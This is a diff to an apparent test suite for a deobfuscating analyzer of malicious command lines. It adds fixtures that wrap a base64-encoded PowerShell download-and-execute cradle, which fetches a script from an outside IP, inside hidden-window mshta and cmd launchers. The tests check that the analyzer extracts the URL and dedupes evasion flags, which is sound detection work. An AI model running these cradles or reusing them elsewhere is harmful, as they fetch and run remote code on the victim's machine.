@@ -41,6 +41,37 @@ describe('nested interpreter re-entry (§2.1)', () => {
     expect(cmdHops.length).toBe(4) // NESTED_REENTRY_MAX_DEPTH
     expect(r.layers[r.layers.length - 1].text).toContain('cmd /c') // did NOT fully unwrap — the cap stopped it
   })
+
+  // Whole-branch review F1 (CRITICAL): detectInterpreter is anchored to the
+  // start of the string, and reenterNestedInterpreter bailed the moment the
+  // anchored check returned 'unknown' — so a nested launcher that isn't the
+  // literal first token of the extracted body was missed entirely (empty
+  // layers/iocs). These three shapes were verified failing before the
+  // non-anchored fallback fix: the mshta Run() launcher-inside-a-quoted-arg
+  // shape (spec §2.1), and two realistic cmd loader shapes (a preceding
+  // command, and a preceding `start /min`).
+  const ENC = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA=' // -> IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')
+  const NESTED_SHAPES: [string, string][] = [
+    ['mshta launcher buried inside a quoted Run() arg', `mshta vbscript:CreateObject("WScript.Shell").Run("powershell -w hidden -enc ${ENC}")`],
+    ['cmd: a preceding command before the launcher', `cmd /c whoami & powershell -w hidden -enc ${ENC}`],
+    ['cmd: a preceding `start /min` before the launcher', `cmd /c start /min powershell -nop -w hidden -enc ${ENC}`],
+  ]
+
+  it.each(NESTED_SHAPES)('%s: still finds the nested launcher and decodes through to the inner IOC', async (_label, input) => {
+    const r = await analyze(input)
+    expect(r.iocs.map((i) => i.raw)).toContain('http://45.9.148.20/a.ps1')
+    expect(r.layers.some((l) => l.transform.includes('→'))).toBe(true)
+  })
+})
+
+describe('evasion flags are deduped (whole-branch review F2)', () => {
+  it('cmd /c powershell -w hidden -enc <b64> reports -enc and -w exactly once each, not twice', async () => {
+    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
+    const r = await analyze('cmd /c powershell -w hidden -enc ' + enc)
+    const flagNames = r.flags.map((f) => f.flag)
+    expect(flagNames.filter((f) => f === '-enc').length).toBe(1)
+    expect(flagNames.filter((f) => f === '-w').length).toBe(1)
+  })
 })
 
 describe('WSH numeric char-code decode (§4)', () => {
